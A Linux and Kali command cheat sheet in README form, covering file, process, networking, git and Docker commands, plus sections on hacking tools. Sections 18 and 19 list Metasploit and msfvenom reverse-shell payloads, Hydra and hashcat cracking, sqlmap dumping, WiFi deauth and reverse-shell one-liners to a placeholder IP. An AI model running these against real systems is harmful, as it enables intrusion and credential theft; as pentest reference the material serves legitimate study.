<div align="center">

<pre>
 ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
 ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
</pre>

```bash
> LINUX  ·  KALI  ·  BASH  ·  TERMINAL  ·  HACKING TOOLS  ·  COMPLETE REFERENCE
```

[![Linux](https://img.shields.io/badge/Linux-Commands-yellow?style=for-the-badge&logo=linux&logoColor=black)](https://linux.org)
[![Kali](https://img.shields.io/badge/Kali-Linux-blue?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org)
[![Bash](https://img.shields.io/badge/Bash-Scripting-orange?style=for-the-badge&logo=gnubash&logoColor=white)](https://gnu.org/software/bash)
[![Terminal](https://img.shields.io/badge/Terminal-Mastery-red?style=for-the-badge&logo=windowsterminal&logoColor=white)](https://github.com)

</div>

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║                  COMMAND  INDEX                              ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> 01  →  Navigation & File System
> 02  →  File Operations
> 03  →  File Viewing & Editing
> 04  →  Permissions & Ownership
> 05  →  User & Group Management
> 06  →  Process Management
> 07  →  Networking Commands
> 08  →  Package Management
> 09  →  Disk & Storage
> 10  →  Compression & Archives
> 11  →  Searching & Filtering
> 12  →  Redirection & Pipes
> 13  →  Environment & Shell
> 14  →  SSH & Remote Access
> 15  →  System Info & Monitoring
> 16  →  Cron Jobs & Scheduling
> 17  →  Bash Scripting
> 18  →  Kali Linux Hacking Tools
> 19  →  Netcat & Socat
> 20  →  Git Commands
> 21  →  Docker Commands
> 22  →  Tmux & Screen
> 23  →  Firewall & iptables
> 24  →  Log Analysis
> 25  →  One-Liners & Power Tricks
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    01  ·  N A V I G A T I O N   &   F I L E   S Y S T E M   ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> pwd                          # print current working directory
> ls                           # list files
> ls -la                       # list all files with permissions (detailed)
> ls -lh                       # human readable file sizes
> ls -lt                       # sort by modification time
> cd /path/to/dir              # change directory
> cd ..                        # go up one directory
> cd ~                         # go to home directory
> cd -                         # go to previous directory
> tree                         # show directory tree structure
> tree -L 2                    # tree limited to 2 levels deep
> du -sh *                     # show size of each item in current dir
> du -sh /path                 # disk usage of a specific path
> realpath file.txt            # show full absolute path of file
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    02  ·  F I L E   O P E R A T I O N S                     ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> touch file.txt               # create empty file
> mkdir folder                 # create directory
> mkdir -p a/b/c               # create nested directories
> cp file.txt copy.txt         # copy file
> cp -r dir1 dir2              # copy directory recursively
> mv old.txt new.txt           # move or rename file
> mv file.txt /path/           # move file to directory
> rm file.txt                  # remove file
> rm -rf folder/               # force remove directory (use with caution)
> rmdir folder                 # remove empty directory
> ln -s /original /link        # create symbolic link
> ln file hardlink             # create hard link
> stat file.txt                # detailed file metadata
> file file.txt                # detect file type
> wc -l file.txt               # count lines in file
> wc -w file.txt               # count words in file
> diff file1.txt file2.txt     # compare two files
> rsync -av src/ dest/         # sync files/directories
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    03  ·  F I L E   V I E W I N G   &   E D I T I N G       ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> cat file.txt                 # display full file content
> cat -n file.txt              # display with line numbers
> less file.txt                # scroll through file (q to quit)
> more file.txt                # page through file
> head file.txt                # show first 10 lines
> head -n 20 file.txt          # show first 20 lines
> tail file.txt                # show last 10 lines
> tail -n 50 file.txt          # show last 50 lines
> tail -f file.txt             # follow file in real time (logs)
> nano file.txt                # simple terminal text editor
> vim file.txt                 # powerful vi editor
> vi file.txt                  # classic vi editor

# ── VIM QUICK REFERENCE ────────────────────────────────────
> i                            # insert mode
> ESC                          # command mode
> :w                           # save file
> :q                           # quit
> :wq                          # save and quit
> :q!                          # quit without saving
> dd                           # delete line
> yy                           # copy line
> p                            # paste
> /word                        # search for word
> :%s/old/new/g                # find and replace all
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    04  ·  P E R M I S S I O N S   &   O W N E R S H I P     ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> ls -l                        # view permissions of files
> chmod 755 file               # rwx r-x r-x (owner full, others read/exec)
> chmod 644 file               # rw- r-- r-- (owner rw, others read)
> chmod 777 file               # full permissions for everyone
> chmod +x script.sh           # add execute permission
> chmod -x script.sh           # remove execute permission
> chmod u+rw file              # add read/write to user
> chmod g-w file               # remove write from group
> chmod o-r file               # remove read from others
> chown user file              # change file owner
> chown user:group file        # change owner and group
> chown -R user folder/        # recursively change ownership
> chgrp group file             # change group only
> umask 022                    # set default permission mask
> sudo command                 # run command as superuser
> sudo su                      # switch to root shell
> sudo -i                      # login as root
> su username                  # switch to another user
> visudo                       # safely edit sudoers file

# ── PERMISSION REFERENCE ───────────────────────────────────
# > 4 = read (r)   2 = write (w)   1 = execute (x)
# > 7 = rwx        6 = rw-         5 = r-x         4 = r--
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    05  ·  U S E R   &   G R O U P   M A N A G E M E N T     ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> whoami                       # show current username
> who                          # show logged in users
> w                            # show who is logged in + activity
> id                           # show user ID and group ID
> id username                  # show info for specific user
> useradd username             # create new user
> useradd -m username          # create user with home directory
> passwd username              # set or change user password
> usermod -aG group user       # add user to a group
> userdel username             # delete user
> userdel -r username          # delete user and home directory
> groupadd groupname           # create new group
> groupdel groupname           # delete group
> groups username              # list groups of a user
> cat /etc/passwd              # view all users
> cat /etc/shadow              # view hashed passwords (root only)
> cat /etc/group               # view all groups
> last                         # show last login history
> lastlog                      # show last login for all users
> finger username              # detailed user info
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    06  ·  P R O C E S S   M A N A G E M E N T               ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> ps                           # show current user processes
> ps aux                       # show all running processes
> ps aux | grep nginx          # find specific process
> top                          # live process viewer
> htop                         # interactive process viewer (better top)
> kill PID                     # kill process by PID
> kill -9 PID                  # force kill process
> killall processname          # kill all processes by name
> pkill processname            # kill by name pattern
> jobs                         # list background jobs
> bg                           # resume job in background
> fg                           # bring job to foreground
> command &                    # run command in background
> nohup command &              # run immune to hangups
> nice -n 10 command           # run with lower priority
> renice -n 5 PID              # change priority of running process
> pstree                       # show process tree
> lsof                         # list open files
> lsof -i :80                  # show process using port 80
> strace command               # trace system calls
> watch -n 2 command           # run command every 2 seconds
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    07  ·  N E T W O R K I N G   C O M M A N D S             ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── INTERFACE & IP ─────────────────────────────────────────
> ifconfig                     # show network interfaces (old)
> ip a                         # show all IP addresses (modern)
> ip r                         # show routing table
> ip link                      # show network links
> ip neigh                     # show ARP table
> hostname                     # show system hostname
> hostname -I                  # show all local IP addresses

# ── CONNECTIVITY ───────────────────────────────────────────
> ping google.com              # test connectivity
> ping -c 4 8.8.8.8            # ping 4 times only
> traceroute google.com        # trace packet route
> mtr google.com               # live traceroute + ping combo
> curl https://example.com     # fetch URL content
> wget https://example.com     # download file from URL
> curl -I https://example.com  # show HTTP response headers only
> curl -X POST -d "data" url   # send POST request

# ── DNS & LOOKUP ───────────────────────────────────────────
> nslookup domain.com          # DNS lookup
> dig domain.com               # detailed DNS query
> dig domain.com MX            # query mail records
> dig +short domain.com        # quick IP result
> host domain.com              # simple DNS resolver
> whois domain.com             # domain registration info

# ── PORTS & CONNECTIONS ────────────────────────────────────
> netstat -tulnp               # show all listening ports
> ss -tulnp                    # modern netstat replacement
> ss -s                        # socket statistics summary
> lsof -i :443                 # what is using port 443

# ── FIREWALL ───────────────────────────────────────────────
> ufw status                   # check firewall status
> ufw enable                   # enable firewall
> ufw allow 22                 # allow SSH port
> ufw deny 23                  # deny telnet port
> ufw allow from 192.168.1.0/24  # allow subnet
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    08  ·  P A C K A G E   M A N A G E M E N T               ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── APT  (Debian · Ubuntu · Kali) ─────────────────────────
> sudo apt update              # refresh package index
> sudo apt upgrade             # upgrade all packages
> sudo apt install pkg         # install package
> sudo apt remove pkg          # remove package
> sudo apt purge pkg           # remove + delete configs
> sudo apt autoremove          # remove unused dependencies
> sudo apt search keyword      # search for package
> apt list --installed         # list all installed packages
> sudo apt-get dist-upgrade    # full system upgrade

# ── DPKG ──────────────────────────────────────────────────
> dpkg -i package.deb          # install local .deb file
> dpkg -r package              # remove package
> dpkg -l                      # list installed packages
> dpkg -s package              # show package status

# ── YUM / DNF  (RHEL · Fedora · CentOS) ──────────────────
> sudo yum install pkg         # install package
> sudo dnf install pkg         # install (modern yum)
> sudo yum update              # update all packages
> sudo yum remove pkg          # remove package

# ── PACMAN  (Arch · BlackArch) ───────────────────────────
> sudo pacman -Syu             # update system
> sudo pacman -S pkg           # install package
> sudo pacman -R pkg           # remove package
> sudo pacman -Ss keyword      # search packages

# ── SNAP & FLATPAK ────────────────────────────────────────
> sudo snap install pkg        # install snap package
> flatpak install pkg          # install flatpak
> pip install package          # install Python package
> pip3 install package         # install Python3 package
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    09  ·  D I S K   &   S T O R A G E                       ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> df -h                        # disk space usage (human readable)
> df -T                        # show filesystem type
> du -sh folder/               # size of a folder
> du -ah --max-depth=1         # size of each item (1 level)
> lsblk                        # list block devices (drives)
> fdisk -l                     # list all partitions
> fdisk /dev/sda               # partition a disk
> mount /dev/sda1 /mnt         # mount partition
> umount /mnt                  # unmount partition
> blkid                        # show UUIDs of all partitions
> cat /etc/fstab               # view auto-mount config
> mkfs.ext4 /dev/sdb1          # format partition as ext4
> fsck /dev/sda1               # check filesystem for errors
> dd if=/dev/sda of=backup.img # clone entire drive to image
> dd if=boot.iso of=/dev/sdb   # write ISO to USB drive
> hdparm -I /dev/sda           # drive info and specs
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    10  ·  C O M P R E S S I O N   &   A R C H I V E S       ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── TAR ───────────────────────────────────────────────────
> tar -cvf archive.tar folder/ # create tar archive
> tar -xvf archive.tar         # extract tar archive
> tar -czvf archive.tar.gz dir # create gzip compressed tar
> tar -xzvf archive.tar.gz     # extract gzip tar
> tar -cjvf archive.tar.bz2 d  # create bzip2 tar
> tar -xjvf archive.tar.bz2    # extract bzip2 tar
> tar -tf archive.tar          # list tar contents without extract

# ── GZIP / BZIP2 / XZ ─────────────────────────────────────
> gzip file.txt                # compress file (replaces original)
> gzip -d file.txt.gz          # decompress
> bzip2 file.txt               # compress with bzip2
> bzip2 -d file.txt.bz2        # decompress bzip2
> xz file.txt                  # compress with xz (best ratio)
> xz -d file.txt.xz            # decompress xz

# ── ZIP ───────────────────────────────────────────────────
> zip archive.zip file1 file2  # create zip
> zip -r archive.zip folder/   # zip entire folder
> unzip archive.zip            # extract zip
> unzip -l archive.zip         # list zip contents
> unzip archive.zip -d /path   # extract to specific directory
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    11  ·  S E A R C H I N G   &   F I L T E R I N G         ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── GREP ──────────────────────────────────────────────────
> grep "word" file.txt         # search for word in file
> grep -i "word" file.txt      # case insensitive search
> grep -r "word" /path/        # recursive search in directory
> grep -n "word" file.txt      # show line numbers
> grep -v "word" file.txt      # invert — lines NOT matching
> grep -c "word" file.txt      # count matching lines
> grep -l "word" *.txt         # list files containing match
> grep -E "regex" file.txt     # extended regex
> grep -o "pattern" file.txt   # show only matching part

# ── FIND ──────────────────────────────────────────────────
> find / -name "file.txt"      # find file by name (whole system)
> find . -name "*.py"          # find all Python files here
> find / -type d -name "logs"  # find directories named logs
> find / -type f -size +100M   # find files larger than 100MB
> find / -mtime -7             # files modified in last 7 days
> find / -perm 777             # find files with 777 permissions
> find / -user root            # find files owned by root
> find . -name "*.sh" -exec chmod +x {} \;  # find and execute

# ── LOCATE & WHICH ────────────────────────────────────────
> locate filename              # fast file search (uses database)
> updatedb                     # update locate database
> which python3                # show full path of command
> whereis python3              # show binary + man + source paths
> type ls                      # show how command is interpreted

# ── AWK & SED ─────────────────────────────────────────────
> awk '{print $1}' file.txt    # print first column
> awk -F: '{print $1}' /etc/passwd  # use : as delimiter
> sed 's/old/new/g' file.txt   # replace all occurrences
> sed -i 's/old/new/g' file    # replace in-place
> sed -n '5,10p' file.txt      # print lines 5 to 10
> sed '/pattern/d' file.txt    # delete matching lines
> cut -d: -f1 /etc/passwd      # cut first field by delimiter
> sort file.txt                # sort lines alphabetically
> sort -n file.txt             # sort numerically
> sort -r file.txt             # sort in reverse
> uniq file.txt                # remove duplicate lines
> uniq -c file.txt             # count occurrences
> tr 'a-z' 'A-Z' < file.txt   # translate lowercase to uppercase
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    12  ·  R E D I R E C T I O N   &   P I P E S             ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> command > file.txt           # redirect output to file (overwrite)
> command >> file.txt          # redirect output to file (append)
> command 2> error.txt         # redirect errors to file
> command 2>&1                 # redirect errors to stdout
> command &> all.txt           # redirect both output and errors
> command < file.txt           # use file as input
> command1 | command2          # pipe output to next command
> command | tee file.txt       # output to screen AND save to file
> command | tee -a file.txt    # tee in append mode
> cat /dev/null > file.txt     # clear file contents
> command > /dev/null 2>&1     # suppress all output

# ── PRACTICAL PIPE CHAINS ─────────────────────────────────
> ps aux | grep nginx | awk '{print $2}'   # get nginx PIDs
> cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn
> ls -la | grep "^-" | wc -l   # count regular files
> cat /etc/passwd | cut -d: -f1 | sort    # sorted user list
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    13  ·  E N V I R O N M E N T   &   S H E L L             ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> echo $PATH                   # print PATH variable
> echo $HOME                   # print home directory
> echo $USER                   # print current user
> echo $SHELL                  # print current shell
> printenv                     # print all environment variables
> export VAR=value             # set environment variable
> unset VAR                    # remove environment variable
> alias ll='ls -la'            # create command alias
> alias                        # list all aliases
> unalias ll                   # remove alias
> source ~/.bashrc             # reload bash config
> . ~/.bashrc                  # same as source
> history                      # show command history
> history | grep ssh           # search history
> !!                           # repeat last command
> !n                           # repeat command number n
> ctrl + r                     # reverse search history
> ctrl + c                     # kill current command
> ctrl + z                     # suspend current command
> ctrl + d                     # logout / EOF
> ctrl + l                     # clear terminal
> ctrl + a                     # go to start of line
> ctrl + e                     # go to end of line

# ── SHELL CONFIG FILES ────────────────────────────────────
> ~/.bashrc                    # bash config (interactive non-login)
> ~/.bash_profile              # bash config (login shell)
> ~/.zshrc                     # zsh config
> /etc/environment             # system-wide environment variables
> /etc/profile                 # system-wide shell config
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    14  ·  S S H   &   R E M O T E   A C C E S S             ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── SSH BASICS ────────────────────────────────────────────
> ssh user@host                # connect to remote host
> ssh user@host -p 2222        # connect on custom port
> ssh -i key.pem user@host     # connect with private key
> ssh -v user@host             # verbose (debug connection)
> ssh -X user@host             # enable X11 forwarding (GUI)
> exit                         # close SSH session

# ── KEY MANAGEMENT ────────────────────────────────────────
> ssh-keygen -t rsa -b 4096   # generate RSA key pair
> ssh-keygen -t ed25519        # generate ED25519 key (recommended)
> ssh-copy-id user@host        # copy public key to remote host
> cat ~/.ssh/id_rsa.pub        # view public key
> chmod 600 ~/.ssh/id_rsa      # set correct key permissions

# ── SCP & SFTP ────────────────────────────────────────────
> scp file.txt user@host:/path # upload file via SSH
> scp user@host:/path/file .   # download file via SSH
> scp -r folder/ user@host:/p  # upload entire folder
> sftp user@host               # interactive SFTP session

# ── SSH TUNNELING ─────────────────────────────────────────
> ssh -L 8080:localhost:80 u@h # local port forward
> ssh -R 9090:localhost:80 u@h # remote port forward
> ssh -D 1080 user@host        # dynamic SOCKS proxy

# ── SSH CONFIG ────────────────────────────────────────────
> nano ~/.ssh/config           # SSH client config file
> nano /etc/ssh/sshd_config    # SSH server config
> systemctl restart ssh        # restart SSH service
> systemctl status ssh         # check SSH status
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    15  ·  S Y S T E M   I N F O   &   M O N I T O R I N G   ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── SYSTEM INFO ───────────────────────────────────────────
> uname -a                     # all kernel information
> uname -r                     # kernel version only
> cat /etc/os-release          # OS distribution info
> hostnamectl                  # hostname and system info
> uptime                       # system uptime + load average
> date                         # current date and time
> timedatectl                  # timezone and time info
> cal                          # calendar

# ── HARDWARE INFO ─────────────────────────────────────────
> lscpu                        # CPU info
> lshw                         # detailed hardware list
> lspci                        # PCI devices (GPU, NIC, etc.)
> lsusb                        # USB devices
> dmidecode                    # BIOS/hardware info (root)
> cat /proc/cpuinfo             # CPU details from kernel
> cat /proc/meminfo             # memory details from kernel

# ── MEMORY ────────────────────────────────────────────────
> free -h                      # RAM usage (human readable)
> free -m                      # RAM usage in MB
> vmstat                       # virtual memory statistics

# ── PERFORMANCE ───────────────────────────────────────────
> top                          # live system monitor
> htop                         # interactive system monitor
> iotop                        # live disk I/O monitor
> iftop                        # live network bandwidth monitor
> nethogs                      # network usage per process
> glances                      # all-in-one system monitor

# ── SERVICES ──────────────────────────────────────────────
> systemctl status service     # check service status
> systemctl start service      # start service
> systemctl stop service       # stop service
> systemctl restart service    # restart service
> systemctl enable service     # enable on boot
> systemctl disable service    # disable on boot
> systemctl list-units         # list all active units
> journalctl -u service        # logs for a service
> journalctl -f                # follow system logs live
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    16  ·  C R O N   J O B S   &   S C H E D U L I N G       ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
> crontab -e                   # edit cron jobs for current user
> crontab -l                   # list current cron jobs
> crontab -r                   # remove all cron jobs
> sudo crontab -e              # edit root cron jobs
> cat /etc/crontab             # system-wide crontab

# ── CRON SYNTAX ───────────────────────────────────────────
# > * * * * * command
# > | | | | |
# > | | | | └── Day of week  (0-7, 0=Sunday)
# > | | | └──── Month        (1-12)
# > | | └────── Day of month (1-31)
# > | └──────── Hour         (0-23)
# > └────────── Minute       (0-59)

# ── CRON EXAMPLES ─────────────────────────────────────────
> 0 * * * *   command          # every hour
> 0 0 * * *   command          # every day at midnight
> */5 * * * * command          # every 5 minutes
> 0 9 * * 1   command          # every Monday at 9am
> 0 0 1 * *   command          # first day of every month
> @reboot     command          # run once at startup
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    17  ·  B A S H   S C R I P T I N G                       ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── STRUCTURE ─────────────────────────────────────────────
> #!/bin/bash                  # shebang — always first line
> chmod +x script.sh           # make script executable
> ./script.sh                  # run script
> bash script.sh               # run with bash directly

# ── VARIABLES ─────────────────────────────────────────────
> name="Ayush"                 # declare variable
> echo $name                   # use variable
> echo "Hello $name"           # string interpolation
> readonly PI=3.14             # constant variable
> unset name                   # delete variable

# ── INPUT ─────────────────────────────────────────────────
> read name                    # read user input
> read -p "Enter name: " name  # prompt then read
> read -s password             # silent input (passwords)
> $1 $2 $3                     # positional arguments
> $@                           # all arguments
> $#                           # number of arguments
> $0                           # script name

# ── CONDITIONS ────────────────────────────────────────────
> if [ $a -eq $b ]; then       # equality check
>   echo "equal"
> elif [ $a -gt $b ]; then
>   echo "greater"
> else
>   echo "lesser"
> fi

# ── COMPARISON OPERATORS ──────────────────────────────────
# > -eq  equal          -ne  not equal
# > -lt  less than      -gt  greater than
# > -le  less or equal  -ge  greater or equal
# > -z   string empty   -n   string not empty
# > -f   file exists    -d   directory exists

# ── LOOPS ─────────────────────────────────────────────────
> for i in 1 2 3; do echo $i; done         # for loop
> for i in {1..10}; do echo $i; done       # range loop
> for f in *.txt; do echo $f; done         # loop over files
> while [ $i -lt 10 ]; do i=$((i+1)); done # while loop
> until [ $i -ge 10 ]; do i=$((i+1)); done # until loop

# ── FUNCTIONS ─────────────────────────────────────────────
> greet() {                    # define function
>   echo "Hello $1"
> }
> greet "World"                # call function

# ── SPECIAL VARIABLES ─────────────────────────────────────
> $?                           # exit status of last command
> $$                           # current process PID
> $!                           # PID of last background job
> $RANDOM                      # random number
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    18  ·  K A L I   L I N U X   H A C K I N G   T O O L S   ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── NMAP — Network Scanner ────────────────────────────────
> nmap 192.168.1.1             # basic scan
> nmap -sV 192.168.1.1         # detect service versions
> nmap -O 192.168.1.1          # detect OS
> nmap -p 80,443 192.168.1.1   # scan specific ports
> nmap -p- 192.168.1.1         # scan all 65535 ports
> nmap -sS 192.168.1.1         # stealth SYN scan
> nmap -sU 192.168.1.1         # UDP scan
> nmap -A 192.168.1.0/24       # aggressive scan on subnet
> nmap --script vuln target    # run vulnerability scripts
> nmap -oN output.txt target   # save output to file

# ── METASPLOIT ────────────────────────────────────────────
> msfconsole                   # start Metasploit
> search eternalblue           # search for exploit
> use exploit/windows/smb/...  # select exploit
> show options                 # view required options
> set RHOSTS 192.168.1.5       # set target IP
> set LHOST 192.168.1.10       # set your IP
> run                          # execute exploit
> sessions -l                  # list active sessions
> sessions -i 1                # interact with session 1
> msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# ── BURP SUITE ────────────────────────────────────────────
> burpsuite                    # launch Burp Suite GUI
# ── Set browser proxy to 127.0.0.1:8080 to intercept

# ── HYDRA — Password Cracking ─────────────────────────────
> hydra -l user -P pass.txt ssh://192.168.1.1        # SSH brute
> hydra -L users.txt -P pass.txt ftp://target        # FTP brute
> hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# ── JOHN THE RIPPER ───────────────────────────────────────
> john hash.txt                # crack with auto detection
> john --wordlist=rockyou.txt hash.txt  # dictionary attack
> john --format=md5 hash.txt   # specify hash format
> john --show hash.txt         # show cracked passwords

# ── HASHCAT ───────────────────────────────────────────────
> hashcat -m 0 hash.txt wordlist.txt    # MD5 crack
> hashcat -m 1000 hash.txt wordlist.txt # NTLM crack
> hashcat -m 1800 hash.txt wordlist.txt # SHA-512
> hashcat -a 3 hash.txt ?a?a?a?a?a     # brute force mask

# ── GOBUSTER — Directory Enumeration ─────────────────────
> gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
> gobuster dns -d target.com -w subdomains.txt
> gobuster dir -u http://target -w wordlist -x php,html,txt

# ── NIKTO — Web Scanner ───────────────────────────────────
> nikto -h http://target.com   # basic web scan
> nikto -h http://target -p 8080  # custom port scan
> nikto -h target -o output.html  # save report

# ── SQLMAP — SQL Injection ────────────────────────────────
> sqlmap -u "http://site.com/page?id=1" --dbs          # list databases
> sqlmap -u "http://site.com/page?id=1" -D db --tables # list tables
> sqlmap -u "http://site.com/page?id=1" --dump         # dump data
> sqlmap -u target --forms --batch                     # auto-detect forms

# ── AIRCRACK-NG — Wireless ───────────────────────────────
> airmon-ng start wlan0        # enable monitor mode
> airodump-ng wlan0mon         # scan for WiFi networks
> airodump-ng -c 6 --bssid XX:XX:XX -w capture wlan0mon  # capture
> aireplay-ng --deauth 0 -a BSSID wlan0mon  # deauth attack
> aircrack-ng -w rockyou.txt capture.cap    # crack WPA

# ── WIRESHARK / TCPDUMP ───────────────────────────────────
> wireshark                    # launch GUI packet analyzer
> tcpdump -i eth0              # capture on interface
> tcpdump -i eth0 port 80      # capture HTTP traffic
> tcpdump -i eth0 -w cap.pcap  # save capture to file
> tcpdump -r cap.pcap          # read saved capture
> tcpdump host 192.168.1.5     # capture from/to specific IP

# ── OSINT TOOLS ───────────────────────────────────────────
> theHarvester -d example.com -b google  # email/subdomain OSINT
> maltego                      # visual OSINT + link analysis
> recon-ng                     # modular OSINT framework
> sherlock username             # find username across platforms
> whois domain.com             # domain info
> dig domain.com ANY           # all DNS records

# ── PRIVILEGE ESCALATION ──────────────────────────────────
> sudo -l                      # list sudo permissions
> find / -perm -4000 2>/dev/null  # find SUID binaries
> find / -writable 2>/dev/null    # find writable files
> cat /etc/crontab             # check cron jobs for exploits
> uname -a                     # check kernel version
> linpeas.sh                   # auto Linux priv esc check
> winpeas.exe                  # auto Windows priv esc check
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    19  ·  N E T C A T   &   S O C A T                       ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── NETCAT (nc) ───────────────────────────────────────────
> nc -lvnp 4444               # listen on port 4444
> nc 192.168.1.5 4444         # connect to host:port
> nc -lvnp 4444 > file.txt    # receive file
> nc host 4444 < file.txt     # send file
> nc -z -v host 20-80         # port scan range
> nc -e /bin/bash host 4444   # reverse shell (bind)

# ── REVERSE SHELLS ────────────────────────────────────────
> bash -i >& /dev/tcp/IP/4444 0>&1           # bash reverse shell
> python3 -c 'import socket,subprocess,os; ...'  # python reverse
> php -r '$sock=fsockopen("IP",4444); exec("/bin/sh -i <&3 >&3 2>&3");'

# ── SOCAT ─────────────────────────────────────────────────
> socat TCP-LISTEN:4444 -                    # basic listener
> socat TCP:IP:4444 EXEC:/bin/bash           # connect + shell
> socat TCP-LISTEN:4444 EXEC:/bin/bash       # bind shell
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    20  ·  G I T   C O M M A N D S                           ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── SETUP ─────────────────────────────────────────────────
> git config --global user.name "Name"       # set username
> git config --global user.email "e@mail"    # set email
> git config --list                          # view git config

# ── BASICS ────────────────────────────────────────────────
> git init                     # initialize repo
> git clone url                # clone remote repo
> git status                   # show changed files
> git add file.txt             # stage file
> git add .                    # stage all changes
> git commit -m "message"      # commit with message
> git push origin main         # push to remote
> git pull origin main         # pull from remote
> git fetch                    # fetch without merge

# ── BRANCHES ──────────────────────────────────────────────
> git branch                   # list branches
> git branch new-branch        # create branch
> git checkout new-branch      # switch branch
> git checkout -b new-branch   # create and switch
> git merge branch             # merge branch into current
> git branch -d branch         # delete branch

# ── HISTORY & DIFF ────────────────────────────────────────
> git log                      # commit history
> git log --oneline            # compact history
> git diff                     # show unstaged changes
> git diff --staged            # show staged changes
> git show commit-hash         # show specific commit

# ── UNDO ──────────────────────────────────────────────────
> git restore file.txt         # discard local changes
> git reset HEAD file.txt      # unstage file
> git reset --hard HEAD~1      # undo last commit (destructive)
> git revert commit-hash       # safe undo via new commit
> git stash                    # stash current changes
> git stash pop                # restore stashed changes
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    21  ·  D O C K E R   C O M M A N D S                     ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── IMAGES ────────────────────────────────────────────────
> docker pull ubuntu           # pull image from Docker Hub
> docker images                # list local images
> docker rmi image             # remove image
> docker build -t name .       # build image from Dockerfile

# ── CONTAINERS ────────────────────────────────────────────
> docker run ubuntu            # run container
> docker run -it ubuntu bash   # run interactive container
> docker run -d -p 80:80 nginx # run detached with port mapping
> docker ps                    # list running containers
> docker ps -a                 # list all containers
> docker stop container        # stop container
> docker rm container          # remove container
> docker exec -it id bash      # shell into running container
> docker logs container        # view container logs

# ── VOLUMES & NETWORK ─────────────────────────────────────
> docker volume create vol     # create volume
> docker run -v vol:/data img  # mount volume
> docker network ls            # list networks
> docker network create net    # create network

# ── COMPOSE ───────────────────────────────────────────────
> docker-compose up            # start all services
> docker-compose up -d         # start detached
> docker-compose down          # stop and remove containers
> docker-compose logs          # view all service logs
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    22  ·  T M U X   &   S C R E E N                         ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── TMUX ──────────────────────────────────────────────────
> tmux                         # start tmux session
> tmux new -s name             # new named session
> tmux ls                      # list sessions
> tmux attach -t name          # attach to session
> tmux kill-session -t name    # kill session

# ── TMUX SHORTCUTS  (prefix = Ctrl+b) ─────────────────────
# > Ctrl+b c      — new window
# > Ctrl+b n      — next window
# > Ctrl+b p      — previous window
# > Ctrl+b ,      — rename window
# > Ctrl+b %      — split vertical pane
# > Ctrl+b "      — split horizontal pane
